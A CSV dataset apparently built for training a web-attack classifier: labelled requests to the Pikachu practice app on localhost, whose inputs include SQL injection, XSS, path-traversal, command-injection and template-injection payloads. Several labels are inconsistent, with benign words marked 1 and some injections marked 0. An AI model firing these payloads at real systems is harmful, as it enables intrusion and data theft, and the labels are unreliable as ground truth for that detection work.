label,url,param,payload,risk_level,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,abc    ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,ready,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,active,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,') OR ('1'='1,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,sample_input,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,2023-10-27,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,"' UNION SELECT 1,2,3,4,5 --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,done,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,test12345,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,hello_world,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,; cat /etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,test_safe_string,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,inactive,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,../../../../../../../../etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,test_safe_string #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,test_safe_string -- ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,..\..\..\..\..\..\..\..\windows\win.ini,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,; whoami,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,test_safe_string%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,"'""><script>alert(1)</script>",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,user001,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,javascript:alert(1),normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,<%= 7*7 %>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,'%00,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,/etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,user002,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,user003,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,normaltext,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,0,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,<body onload=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,'%00 -- ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,user004,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,ok,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,0  ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,user005,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,php://filter/convert.base64-encode/resource=index.php,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,0 -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,{{7*7}},normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,random_user_name,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,0%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,{{config}},normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,') OR ('1'='1,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,ready,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,<iframe src=javascript:alert(1)></iframe>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,1,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,| type C:\Windows\win.ini,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,sample_input,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,| whoami,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,1%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,test12345,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,|| whoami,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,../../../../../../../../etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,test_safe_string,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,1%00   ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,<img src=x onerror=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,test_safe_string #,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,..\..\..\..\..\..\..\..\windows\win.ini,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,1%00 #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,test_safe_string -- ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,1' AND 1=1 #,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,test_safe_string%00,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,user001,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,/etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,<script>alert(1)</script>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,1' AND 1=2 #,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,user002,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,user003,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,0,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,2023-10-27,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,user004,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,<svg/onload=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,0  ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,user005,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,; cat /etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,0 -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,{{7*7}},normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,0%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,{{config}},normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,C:\Windows\win.ini,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,1,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,| type C:\Windows\win.ini,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,; whoami,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,1%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,| whoami,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,1%00   ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,|| whoami,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,`whoami`,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,1%00 #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,<%= 7*7 %>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,1' AND 1=1 #,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,"""",normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,abc,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,""" OR 1=1 --",normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,<body onload=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,"""",normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,${7*7},normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,1' AND 1=2 #,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,""" OR 1=1 --",normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,& ping -c 1 127.0.0.1,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,${7*7},normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,abc ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,& whoami,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,2023-10-27,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,& ping -c 1 127.0.0.1,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,',normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,<iframe src=javascript:alert(1)></iframe>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,& whoami,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,; cat /etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,' -- ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,abc  ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,',normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,' -- ,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,<img src=x onerror=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,' AND sleep(5) --,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,; whoami,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,' OR 1=1 --,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,abc    ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,' AND sleep(5) --,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,submit,"' UNION SELECT 1,2,3,4,5 --",normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,' OR 1=1 --,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,<%= 7*7 %>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=348,message,"' UNION SELECT 1,2,3,4,5 --",normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,active,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,<script>alert(1)</script>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,<body onload=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,done,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,<svg/onload=alert(1)>,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
